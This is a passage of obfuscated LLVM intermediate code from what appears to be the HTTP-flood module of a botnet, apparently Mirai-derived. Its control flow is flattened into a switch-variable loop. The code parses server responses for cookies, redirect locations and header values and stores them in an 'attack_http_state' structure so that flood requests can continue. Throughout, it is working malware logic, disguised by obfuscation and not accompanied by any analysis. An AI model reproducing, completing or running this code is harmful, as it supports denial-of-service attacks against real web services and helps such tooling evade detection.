  %1320 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1321 = load i32, i32* %12, align 4
  %1322 = call i8* @table_retrieve_val(i32 41, i32* null)
  %1323 = call i32 @util_stristr(i8* %1320, i32 %1321, i8* %1322)
  store i32 %1323, i32* %41, align 4
  %1324 = load i32, i32* %41, align 4
  %1325 = sext i32 %1324 to i64
  %1326 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1325
  %1327 = load i8, i8* %1326, align 1
  %1328 = sext i8 %1327 to i32
  %1329 = icmp eq i32 %1328, 32
  %1330 = select i1 %1329, i32 1575436831, i32 856148628
  store i32 %1330, i32* %switchVar
  br label %loopEnd

; <label>:1331:                                   ; preds = %loopEntry
  %1332 = load i32, i32* %41, align 4
  %1333 = add nsw i32 %1332, 1
  store i32 %1333, i32* %41, align 4
  store i32 856148628, i32* %switchVar
  br label %loopEnd

; <label>:1334:                                   ; preds = %loopEntry
  %1335 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1336 = load i32, i32* %41, align 4
  %1337 = sext i32 %1336 to i64
  %1338 = getelementptr inbounds i8, i8* %1335, i64 %1337
  %1339 = load i32, i32* %12, align 4
  %1340 = load i32, i32* %41, align 4
  %1341 = sub nsw i32 %1339, %1340
  %1342 = call i32 @util_memsearch(i8* %1338, i32 %1341, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %1342, i32* %42, align 4
  %1343 = load i32, i32* %42, align 4
  %1344 = icmp ne i32 %1343, -1
  %1345 = select i1 %1344, i32 319163185, i32 -662939655
  store i32 %1345, i32* %switchVar
  br label %loopEnd

; <label>:1346:                                   ; preds = %loopEntry
  %1347 = load i32, i32* %41, align 4
  %1348 = sext i32 %1347 to i64
  %1349 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1348
  store i8* %1349, i8** %43, align 8
  %1350 = load i32, i32* %42, align 4
  %1351 = icmp sge i32 %1350, 2
  %1352 = select i1 %1351, i32 768199482, i32 -1291156493
  store i32 %1352, i32* %switchVar
  br label %loopEnd

; <label>:1353:                                   ; preds = %loopEntry
  %1354 = load i32, i32* %42, align 4
  %1355 = sub nsw i32 %1354, 2
  store i32 %1355, i32* %42, align 4
  store i32 -1291156493, i32* %switchVar
  br label %loopEnd

; <label>:1356:                                   ; preds = %loopEntry
  %1357 = load i32, i32* %41, align 4
  %1358 = load i32, i32* %42, align 4
  %1359 = add nsw i32 %1357, %1358
  %1360 = sext i32 %1359 to i64
  %1361 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1360
  store i8 0, i8* %1361, align 1
  %1362 = load i8*, i8** %43, align 8
  %1363 = load i8*, i8** %43, align 8
  %1364 = call i32 @util_strlen(i8* %1363)
  %1365 = call i8* @table_retrieve_val(i32 42, i32* null)
  %1366 = call i32 @util_stristr(i8* %1362, i32 %1364, i8* %1365)
  %1367 = icmp ne i32 %1366, 0
  %1368 = select i1 %1367, i32 -1112440461, i32 1036804630
  store i32 %1368, i32* %switchVar
  br label %loopEnd

; <label>:1369:                                   ; preds = %loopEntry
  %1370 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1371 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1370, i32 0, i32 13
  store i32 1, i32* %1371, align 4
  store i32 1036804630, i32* %switchVar
  br label %loopEnd

; <label>:1372:                                   ; preds = %loopEntry
  store i32 -662939655, i32* %switchVar
  br label %loopEnd

; <label>:1373:                                   ; preds = %loopEntry
  store i32 1945940457, i32* %switchVar
  br label %loopEnd

; <label>:1374:                                   ; preds = %loopEntry
  %1375 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1376 = load i32, i32* %12, align 4
  %1377 = call i8* @table_retrieve_val(i32 40, i32* null)
  %1378 = call i32 @util_stristr(i8* %1375, i32 %1376, i8* %1377)
  %1379 = icmp ne i32 %1378, -1
  %1380 = select i1 %1379, i32 2060436116, i32 -880186054
  store i32 %1380, i32* %switchVar
  br label %loopEnd

; <label>:1381:                                   ; preds = %loopEntry
  %1382 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1383 = load i32, i32* %12, align 4
  %1384 = call i8* @table_retrieve_val(i32 40, i32* null)
  %1385 = call i32 @util_stristr(i8* %1382, i32 %1383, i8* %1384)
  store i32 %1385, i32* %44, align 4
  %1386 = load i32, i32* %44, align 4
  %1387 = sext i32 %1386 to i64
  %1388 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1387
  %1389 = load i8, i8* %1388, align 1
  %1390 = sext i8 %1389 to i32
  %1391 = icmp eq i32 %1390, 32
  %1392 = select i1 %1391, i32 -324427275, i32 -1097134257
  store i32 %1392, i32* %switchVar
  br label %loopEnd

; <label>:1393:                                   ; preds = %loopEntry
  %1394 = load i32, i32* %44, align 4
  %1395 = add nsw i32 %1394, 1
  store i32 %1395, i32* %44, align 4
  store i32 -1097134257, i32* %switchVar
  br label %loopEnd

; <label>:1396:                                   ; preds = %loopEntry
  %1397 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1398 = load i32, i32* %44, align 4
  %1399 = sext i32 %1398 to i64
  %1400 = getelementptr inbounds i8, i8* %1397, i64 %1399
  %1401 = load i32, i32* %12, align 4
  %1402 = load i32, i32* %44, align 4
  %1403 = sub nsw i32 %1401, %1402
  %1404 = call i32 @util_memsearch(i8* %1400, i32 %1403, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %1404, i32* %45, align 4
  %1405 = load i32, i32* %45, align 4
  %1406 = icmp ne i32 %1405, -1
  %1407 = select i1 %1406, i32 -762707251, i32 -1904357354
  store i32 %1407, i32* %switchVar
  br label %loopEnd

; <label>:1408:                                   ; preds = %loopEntry
  %1409 = load i32, i32* %44, align 4
  %1410 = sext i32 %1409 to i64
  %1411 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1410
  store i8* %1411, i8** %46, align 8
  %1412 = load i32, i32* %45, align 4
  %1413 = icmp sge i32 %1412, 2
  %1414 = select i1 %1413, i32 1942576320, i32 1196035751
  store i32 %1414, i32* %switchVar
  br label %loopEnd

; <label>:1415:                                   ; preds = %loopEntry
  %1416 = load i32, i32* %45, align 4
  %1417 = sub nsw i32 %1416, 2
  store i32 %1417, i32* %45, align 4
  store i32 1196035751, i32* %switchVar
  br label %loopEnd

; <label>:1418:                                   ; preds = %loopEntry
  %1419 = load i32, i32* %44, align 4
  %1420 = load i32, i32* %45, align 4
  %1421 = add nsw i32 %1419, %1420
  %1422 = sext i32 %1421 to i64
  %1423 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1422
  store i8 0, i8* %1423, align 1
  %1424 = load i8*, i8** %46, align 8
  %1425 = call i32 @util_atoi(i8* %1424, i32 10)
  %1426 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1427 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1426, i32 0, i32 14
  store i32 %1425, i32* %1427, align 4
  store i32 -1904357354, i32* %switchVar
  br label %loopEnd

; <label>:1428:                                   ; preds = %loopEntry
  store i32 -1829695534, i32* %switchVar
  br label %loopEnd

; <label>:1429:                                   ; preds = %loopEntry
  %1430 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1431 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1430, i32 0, i32 14
  store i32 0, i32* %1431, align 4
  store i32 -1829695534, i32* %switchVar
  br label %loopEnd

; <label>:1432:                                   ; preds = %loopEntry
  store i32 0, i32* %37, align 4
  store i32 1015270821, i32* %switchVar
  br label %loopEnd

; <label>:1433:                                   ; preds = %loopEntry
  %1434 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1435 = load i32, i32* %37, align 4
  %1436 = sext i32 %1435 to i64
  %1437 = getelementptr inbounds i8, i8* %1434, i64 %1436
  %1438 = load i32, i32* %12, align 4
  %1439 = call i8* @table_retrieve_val(i32 39, i32* null)
  %1440 = call i32 @util_stristr(i8* %1437, i32 %1438, i8* %1439)
  %1441 = icmp ne i32 %1440, -1
  %1442 = select i1 %1441, i32 758041767, i32 -1150498292
  store i32 %1442, i32* %switchVar
  store i1 false, i1* %.reg2mem47
  br label %loopEnd

; <label>:1443:                                   ; preds = %loopEntry
  %1444 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1445 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1444, i32 0, i32 15
  %1446 = load i32, i32* %1445, align 4
  %1447 = icmp slt i32 %1446, 5
  store i32 -1150498292, i32* %switchVar
  store i1 %1447, i1* %.reg2mem47
  br label %loopEnd

; <label>:1448:                                   ; preds = %loopEntry
  %.reload48 = load i1, i1* %.reg2mem47
  %1449 = select i1 %.reload48, i32 -995912489, i32 -2049487952
  store i32 %1449, i32* %switchVar
  br label %loopEnd

; <label>:1450:                                   ; preds = %loopEntry
  %1451 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1452 = load i32, i32* %37, align 4
  %1453 = sext i32 %1452 to i64
  %1454 = getelementptr inbounds i8, i8* %1451, i64 %1453
  %1455 = load i32, i32* %12, align 4
  %1456 = call i8* @table_retrieve_val(i32 39, i32* null)
  %1457 = call i32 @util_stristr(i8* %1454, i32 %1455, i8* %1456)
  store i32 %1457, i32* %47, align 4
  %1458 = load i32, i32* %37, align 4
  %1459 = load i32, i32* %47, align 4
  %1460 = add nsw i32 %1458, %1459
  %1461 = sext i32 %1460 to i64
  %1462 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1461
  %1463 = load i8, i8* %1462, align 1
  %1464 = sext i8 %1463 to i32
  %1465 = icmp eq i32 %1464, 32
  %1466 = select i1 %1465, i32 671198025, i32 -729343463
  store i32 %1466, i32* %switchVar
  br label %loopEnd

; <label>:1467:                                   ; preds = %loopEntry
  %1468 = load i32, i32* %47, align 4
  %1469 = add nsw i32 %1468, 1
  store i32 %1469, i32* %47, align 4
  store i32 -729343463, i32* %switchVar
  br label %loopEnd

; <label>:1470:                                   ; preds = %loopEntry
  %1471 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1472 = load i32, i32* %37, align 4
  %1473 = sext i32 %1472 to i64
  %1474 = getelementptr inbounds i8, i8* %1471, i64 %1473
  %1475 = load i32, i32* %47, align 4
  %1476 = sext i32 %1475 to i64
  %1477 = getelementptr inbounds i8, i8* %1474, i64 %1476
  %1478 = load i32, i32* %12, align 4
  %1479 = load i32, i32* %37, align 4
  %1480 = sub nsw i32 %1478, %1479
  %1481 = load i32, i32* %47, align 4
  %1482 = sub nsw i32 %1480, %1481
  %1483 = call i32 @util_memsearch(i8* %1477, i32 %1482, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %1483, i32* %48, align 4
  %1484 = load i32, i32* %48, align 4
  %1485 = icmp ne i32 %1484, -1
  %1486 = select i1 %1485, i32 178008982, i32 -831705551
  store i32 %1486, i32* %switchVar
  br label %loopEnd

; <label>:1487:                                   ; preds = %loopEntry
  %1488 = load i32, i32* %37, align 4
  %1489 = load i32, i32* %47, align 4
  %1490 = add nsw i32 %1488, %1489
  %1491 = sext i32 %1490 to i64
  %1492 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1491
  store i8* %1492, i8** %49, align 8
  %1493 = load i32, i32* %48, align 4
  %1494 = icmp sge i32 %1493, 2
  %1495 = select i1 %1494, i32 1859232578, i32 1259627911
  store i32 %1495, i32* %switchVar
  br label %loopEnd

; <label>:1496:                                   ; preds = %loopEntry
  %1497 = load i32, i32* %48, align 4
  %1498 = sub nsw i32 %1497, 2
  store i32 %1498, i32* %48, align 4
  store i32 1259627911, i32* %switchVar
  br label %loopEnd

; <label>:1499:                                   ; preds = %loopEntry
  %1500 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1501 = load i32, i32* %37, align 4
  %1502 = sext i32 %1501 to i64
  %1503 = getelementptr inbounds i8, i8* %1500, i64 %1502
  %1504 = load i32, i32* %47, align 4
  %1505 = sext i32 %1504 to i64
  %1506 = getelementptr inbounds i8, i8* %1503, i64 %1505
  %1507 = load i32, i32* %12, align 4
  %1508 = load i32, i32* %37, align 4
  %1509 = sub nsw i32 %1507, %1508
  %1510 = load i32, i32* %47, align 4
  %1511 = sub nsw i32 %1509, %1510
  %1512 = call i32 @util_memsearch(i8* %1506, i32 %1511, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.9, i32 0, i32 0), i32 1)
  %1513 = icmp sgt i32 %1512, 0
  %1514 = select i1 %1513, i32 82981095, i32 537554029
  store i32 %1514, i32* %switchVar
  br label %loopEnd

; <label>:1515:                                   ; preds = %loopEntry
  %1516 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1517 = load i32, i32* %37, align 4
  %1518 = sext i32 %1517 to i64
  %1519 = getelementptr inbounds i8, i8* %1516, i64 %1518
  %1520 = load i32, i32* %47, align 4
  %1521 = sext i32 %1520 to i64
  %1522 = getelementptr inbounds i8, i8* %1519, i64 %1521
  %1523 = load i32, i32* %12, align 4
  %1524 = load i32, i32* %37, align 4
  %1525 = sub nsw i32 %1523, %1524
  %1526 = load i32, i32* %47, align 4
  %1527 = sub nsw i32 %1525, %1526
  %1528 = call i32 @util_memsearch(i8* %1522, i32 %1527, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.9, i32 0, i32 0), i32 1)
  %1529 = sub nsw i32 %1528, 1
  store i32 %1529, i32* %48, align 4
  store i32 537554029, i32* %switchVar
  br label %loopEnd

; <label>:1530:                                   ; preds = %loopEntry
  %1531 = load i32, i32* %37, align 4
  %1532 = load i32, i32* %47, align 4
  %1533 = add nsw i32 %1531, %1532
  %1534 = load i32, i32* %48, align 4
  %1535 = add nsw i32 %1533, %1534
  %1536 = sext i32 %1535 to i64
  %1537 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1536
  store i8 0, i8* %1537, align 1
  store i32 0, i32* %10, align 4
  store i32 -1953793360, i32* %switchVar
  br label %loopEnd

; <label>:1538:                                   ; preds = %loopEntry
  %1539 = load i32, i32* %10, align 4
  %1540 = load i8*, i8** %49, align 8
  %1541 = call i32 @util_strlen(i8* %1540)
  %1542 = icmp slt i32 %1539, %1541
  %1543 = select i1 %1542, i32 1694643462, i32 -1534603676
  store i32 %1543, i32* %switchVar
  br label %loopEnd

; <label>:1544:                                   ; preds = %loopEntry
  %1545 = load i8*, i8** %49, align 8
  %1546 = load i32, i32* %10, align 4
  %1547 = sext i32 %1546 to i64
  %1548 = getelementptr inbounds i8, i8* %1545, i64 %1547
  %1549 = load i8, i8* %1548, align 1
  %1550 = sext i8 %1549 to i32
  %1551 = icmp eq i32 %1550, 61
  %1552 = select i1 %1551, i32 850109323, i32 -1818165774
  store i32 %1552, i32* %switchVar
  br label %loopEnd

; <label>:1553:                                   ; preds = %loopEntry
  store i32 -1534603676, i32* %switchVar
  br label %loopEnd

; <label>:1554:                                   ; preds = %loopEntry
  store i32 512528368, i32* %switchVar
  br label %loopEnd

; <label>:1555:                                   ; preds = %loopEntry
  %1556 = load i32, i32* %10, align 4
  %1557 = add nsw i32 %1556, 1
  store i32 %1557, i32* %10, align 4
  store i32 -1953793360, i32* %switchVar
  br label %loopEnd

; <label>:1558:                                   ; preds = %loopEntry
  %1559 = load i8*, i8** %49, align 8
  %1560 = load i32, i32* %10, align 4
  %1561 = sext i32 %1560 to i64
  %1562 = getelementptr inbounds i8, i8* %1559, i64 %1561
  %1563 = load i8, i8* %1562, align 1
  %1564 = sext i8 %1563 to i32
  %1565 = icmp eq i32 %1564, 61
  %1566 = select i1 %1565, i32 192105540, i32 -894808072
  store i32 %1566, i32* %switchVar
  br label %loopEnd

; <label>:1567:                                   ; preds = %loopEntry
  %1568 = load i32, i32* %10, align 4
  store i32 %1568, i32* %50, align 4
  store i32 0, i32* %51, align 4
  store i32 0, i32* %10, align 4
  store i32 -2060541597, i32* %switchVar
  br label %loopEnd

; <label>:1569:                                   ; preds = %loopEntry
  %1570 = load i32, i32* %10, align 4
  %1571 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1572 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1571, i32 0, i32 15
  %1573 = load i32, i32* %1572, align 4
  %1574 = icmp slt i32 %1570, %1573
  %1575 = select i1 %1574, i32 1364832231, i32 -225494875
  store i32 %1575, i32* %switchVar
  br label %loopEnd

; <label>:1576:                                   ; preds = %loopEntry
  %1577 = load i8*, i8** %49, align 8
  %1578 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1579 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1578, i32 0, i32 16
  %1580 = load i32, i32* %10, align 4
  %1581 = sext i32 %1580 to i64
  %1582 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %1579, i64 0, i64 %1581
  %1583 = getelementptr inbounds [128 x i8], [128 x i8]* %1582, i32 0, i32 0
  %1584 = load i32, i32* %50, align 4
  %1585 = call signext i8 @util_strncmp(i8* %1577, i8* %1583, i32 %1584)
  %1586 = icmp ne i8 %1585, 0
  %1587 = select i1 %1586, i32 -361756282, i32 1996693482
  store i32 %1587, i32* %switchVar
  br label %loopEnd

; <label>:1588:                                   ; preds = %loopEntry
  store i32 1, i32* %51, align 4
  store i32 -225494875, i32* %switchVar
  br label %loopEnd

; <label>:1589:                                   ; preds = %loopEntry
  store i32 -552633407, i32* %switchVar
  br label %loopEnd

; <label>:1590:                                   ; preds = %loopEntry
  %1591 = load i32, i32* %10, align 4
  %1592 = add nsw i32 %1591, 1
  store i32 %1592, i32* %10, align 4
  store i32 -2060541597, i32* %switchVar
  br label %loopEnd

; <label>:1593:                                   ; preds = %loopEntry
  %1594 = load i32, i32* %51, align 4
  %1595 = icmp ne i32 %1594, 0
  %1596 = select i1 %1595, i32 -1294088533, i32 841229323
  store i32 %1596, i32* %switchVar
  br label %loopEnd

; <label>:1597:                                   ; preds = %loopEntry
  %1598 = load i8*, i8** %49, align 8
  %1599 = call i32 @util_strlen(i8* %1598)
  %1600 = icmp slt i32 %1599, 128
  %1601 = select i1 %1600, i32 471434170, i32 -626143869
  store i32 %1601, i32* %switchVar
  br label %loopEnd

; <label>:1602:                                   ; preds = %loopEntry
  %1603 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1604 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1603, i32 0, i32 16
  %1605 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1606 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1605, i32 0, i32 15
  %1607 = load i32, i32* %1606, align 4
  %1608 = sext i32 %1607 to i64
  %1609 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %1604, i64 0, i64 %1608
  %1610 = getelementptr inbounds [128 x i8], [128 x i8]* %1609, i32 0, i32 0
  %1611 = load i8*, i8** %49, align 8
  %1612 = call i32 @util_strcpy(i8* %1610, i8* %1611)
  %1613 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1614 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1613, i32 0, i32 15
  %1615 = load i32, i32* %1614, align 4
  %1616 = add nsw i32 %1615, 1
  store i32 %1616, i32* %1614, align 4
  store i32 -626143869, i32* %switchVar
  br label %loopEnd

; <label>:1617:                                   ; preds = %loopEntry
  store i32 -1294088533, i32* %switchVar
  br label %loopEnd

; <label>:1618:                                   ; preds = %loopEntry
  store i32 -894808072, i32* %switchVar
  br label %loopEnd

; <label>:1619:                                   ; preds = %loopEntry
  store i32 -831705551, i32* %switchVar
  br label %loopEnd

; <label>:1620:                                   ; preds = %loopEntry
  %1621 = load i32, i32* %47, align 4
  %1622 = load i32, i32* %37, align 4
  %1623 = add nsw i32 %1622, %1621
  store i32 %1623, i32* %37, align 4
  store i32 1015270821, i32* %switchVar
  br label %loopEnd

; <label>:1624:                                   ; preds = %loopEntry
  %1625 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1626 = load i32, i32* %12, align 4
  %1627 = call i8* @table_retrieve_val(i32 38, i32* null)
  %1628 = call i32 @util_stristr(i8* %1625, i32 %1626, i8* %1627)
  %1629 = icmp ne i32 %1628, -1
  %1630 = select i1 %1629, i32 453959323, i32 -381807830
  store i32 %1630, i32* %switchVar
  br label %loopEnd

; <label>:1631:                                   ; preds = %loopEntry
  %1632 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1633 = load i32, i32* %12, align 4
  %1634 = call i8* @table_retrieve_val(i32 38, i32* null)
  %1635 = call i32 @util_stristr(i8* %1632, i32 %1633, i8* %1634)
  store i32 %1635, i32* %52, align 4
  %1636 = load i32, i32* %52, align 4
  %1637 = sext i32 %1636 to i64
  %1638 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1637
  %1639 = load i8, i8* %1638, align 1
  %1640 = sext i8 %1639 to i32
  %1641 = icmp eq i32 %1640, 32
  %1642 = select i1 %1641, i32 516184424, i32 678918961
  store i32 %1642, i32* %switchVar
  br label %loopEnd

; <label>:1643:                                   ; preds = %loopEntry
  %1644 = load i32, i32* %52, align 4
  %1645 = add nsw i32 %1644, 1
  store i32 %1645, i32* %52, align 4
  store i32 678918961, i32* %switchVar
  br label %loopEnd

; <label>:1646:                                   ; preds = %loopEntry
  %1647 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1648 = load i32, i32* %52, align 4
  %1649 = sext i32 %1648 to i64
  %1650 = getelementptr inbounds i8, i8* %1647, i64 %1649
  %1651 = load i32, i32* %12, align 4
  %1652 = load i32, i32* %52, align 4
  %1653 = sub nsw i32 %1651, %1652
  %1654 = call i32 @util_memsearch(i8* %1650, i32 %1653, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %1654, i32* %53, align 4
  %1655 = load i32, i32* %53, align 4
  %1656 = icmp ne i32 %1655, -1
  %1657 = select i1 %1656, i32 -760085088, i32 -840383961
  store i32 %1657, i32* %switchVar
  br label %loopEnd

; <label>:1658:                                   ; preds = %loopEntry
  %1659 = load i32, i32* %52, align 4
  %1660 = sext i32 %1659 to i64
  %1661 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1660
  store i8* %1661, i8** %54, align 8
  %1662 = load i32, i32* %53, align 4
  %1663 = icmp sge i32 %1662, 2
  %1664 = select i1 %1663, i32 -258314350, i32 -1618230578
  store i32 %1664, i32* %switchVar
  br label %loopEnd

; <label>:1665:                                   ; preds = %loopEntry
  %1666 = load i32, i32* %53, align 4
  %1667 = sub nsw i32 %1666, 2
  store i32 %1667, i32* %53, align 4
  store i32 -1618230578, i32* %switchVar
  br label %loopEnd

; <label>:1668:                                   ; preds = %loopEntry
  %1669 = load i32, i32* %52, align 4
  %1670 = load i32, i32* %53, align 4
  %1671 = add nsw i32 %1669, %1670
  %1672 = sext i32 %1671 to i64
  %1673 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1672
  store i8 0, i8* %1673, align 1
  %1674 = load i32, i32* %53, align 4
  %1675 = add nsw i32 %1674, 1
  store i32 %1675, i32* %53, align 4
  %1676 = load i8*, i8** %54, align 8
  %1677 = load i32, i32* %53, align 4
  %1678 = call i32 @util_memsearch(i8* %1676, i32 %1677, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.10, i32 0, i32 0), i32 4)
  %1679 = icmp eq i32 %1678, 4
  %1680 = select i1 %1679, i32 -1080806518, i32 -556147200
  store i32 %1680, i32* %switchVar
  br label %loopEnd

; <label>:1681:                                   ; preds = %loopEntry
  store i32 7, i32* %10, align 4
  %1682 = load i8*, i8** %54, align 8
  %1683 = getelementptr inbounds i8, i8* %1682, i64 4
  %1684 = load i8, i8* %1683, align 1
  %1685 = sext i8 %1684 to i32
  %1686 = icmp eq i32 %1685, 115
  %1687 = select i1 %1686, i32 543296754, i32 -1160716703
  store i32 %1687, i32* %switchVar
  br label %loopEnd

; <label>:1688:                                   ; preds = %loopEntry
  %1689 = load i32, i32* %10, align 4
  %1690 = add nsw i32 %1689, 1
  store i32 %1690, i32* %10, align 4
  store i32 -1160716703, i32* %switchVar
  br label %loopEnd

; <label>:1691:                                   ; preds = %loopEntry
  %1692 = load i8*, i8** %54, align 8
  %1693 = load i8*, i8** %54, align 8
  %1694 = load i32, i32* %10, align 4
  %1695 = sext i32 %1694 to i64
  %1696 = getelementptr inbounds i8, i8* %1693, i64 %1695
  %1697 = load i32, i32* %53, align 4
  %1698 = load i32, i32* %10, align 4
  %1699 = sub nsw i32 %1697, %1698
  %1700 = sext i32 %1699 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %1692, i8* %1696, i64 %1700, i32 1, i1 false)
  store i32 0, i32* %10, align 4
  store i32 -451400623, i32* %switchVar
  br label %loopEnd

; <label>:1701:                                   ; preds = %loopEntry
  %1702 = load i8*, i8** %54, align 8
  %1703 = load i32, i32* %10, align 4
  %1704 = sext i32 %1703 to i64
  %1705 = getelementptr inbounds i8, i8* %1702, i64 %1704
  %1706 = load i8, i8* %1705, align 1
  %1707 = sext i8 %1706 to i32
  %1708 = icmp ne i32 %1707, 0
  %1709 = select i1 %1708, i32 -1728798476, i32 1398349692
  store i32 %1709, i32* %switchVar
  br label %loopEnd

; <label>:1710:                                   ; preds = %loopEntry
  %1711 = load i8*, i8** %54, align 8
  %1712 = load i32, i32* %10, align 4
  %1713 = sext i32 %1712 to i64
  %1714 = getelementptr inbounds i8, i8* %1711, i64 %1713
  %1715 = load i8, i8* %1714, align 1
  %1716 = sext i8 %1715 to i32
  %1717 = icmp eq i32 %1716, 47
  %1718 = select i1 %1717, i32 578176793, i32 25981587
  store i32 %1718, i32* %switchVar
  br label %loopEnd

; <label>:1719:                                   ; preds = %loopEntry
  %1720 = load i8*, i8** %54, align 8
  %1721 = load i32, i32* %10, align 4
  %1722 = sext i32 %1721 to i64
  %1723 = getelementptr inbounds i8, i8* %1720, i64 %1722
  store i8 0, i8* %1723, align 1
  store i32 1398349692, i32* %switchVar
  br label %loopEnd

; <label>:1724:                                   ; preds = %loopEntry
  %1725 = load i32, i32* %10, align 4
  %1726 = add nsw i32 %1725, 1
  store i32 %1726, i32* %10, align 4
  store i32 -451400623, i32* %switchVar
  br label %loopEnd

; <label>:1727:                                   ; preds = %loopEntry
  %1728 = load i8*, i8** %54, align 8
  %1729 = call i32 @util_strlen(i8* %1728)
  %1730 = icmp sgt i32 %1729, 0
  %1731 = select i1 %1730, i32 67223197, i32 1585719714
  store i32 %1731, i32* %switchVar
  br label %loopEnd

; <label>:1732:                                   ; preds = %loopEntry
  %1733 = load i8*, i8** %54, align 8
  %1734 = call i32 @util_strlen(i8* %1733)
  %1735 = icmp slt i32 %1734, 128
  %1736 = select i1 %1735, i32 -1918274431, i32 1585719714
  store i32 %1736, i32* %switchVar
  br label %loopEnd

; <label>:1737:                                   ; preds = %loopEntry
  %1738 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1739 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1738, i32 0, i32 7
  %1740 = getelementptr inbounds [129 x i8], [129 x i8]* %1739, i32 0, i32 0
  %1741 = load i8*, i8** %54, align 8
  %1742 = call i32 @util_strcpy(i8* %1740, i8* %1741)
  store i32 1585719714, i32* %switchVar
  br label %loopEnd

; <label>:1743:                                   ; preds = %loopEntry
  %1744 = load i8*, i8** %54, align 8
  %1745 = load i32, i32* %10, align 4
  %1746 = add nsw i32 %1745, 1
  %1747 = sext i32 %1746 to i64
  %1748 = getelementptr inbounds i8, i8* %1744, i64 %1747
  %1749 = call i32 @util_strlen(i8* %1748)
  %1750 = icmp slt i32 %1749, 256
  %1751 = select i1 %1750, i32 717052143, i32 230841318
  store i32 %1751, i32* %switchVar
  br label %loopEnd

; <label>:1752:                                   ; preds = %loopEntry
  %1753 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1754 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1753, i32 0, i32 6
  %1755 = getelementptr inbounds [257 x i8], [257 x i8]* %1754, i32 0, i32 0
  %1756 = getelementptr inbounds i8, i8* %1755, i64 1
  call void @util_zero(i8* %1756, i32 255)
  %1757 = load i8*, i8** %54, align 8
  %1758 = load i32, i32* %10, align 4
  %1759 = add nsw i32 %1758, 1
  %1760 = sext i32 %1759 to i64
  %1761 = getelementptr inbounds i8, i8* %1757, i64 %1760
  %1762 = call i32 @util_strlen(i8* %1761)
  %1763 = icmp sgt i32 %1762, 0
  %1764 = select i1 %1763, i32 -496397486, i32 -1897337435
  store i32 %1764, i32* %switchVar
  br label %loopEnd

; <label>:1765:                                   ; preds = %loopEntry
  %1766 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1767 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1766, i32 0, i32 6
  %1768 = getelementptr inbounds [257 x i8], [257 x i8]* %1767, i32 0, i32 0
  %1769 = getelementptr inbounds i8, i8* %1768, i64 1
  %1770 = load i8*, i8** %54, align 8
  %1771 = load i32, i32* %10, align 4
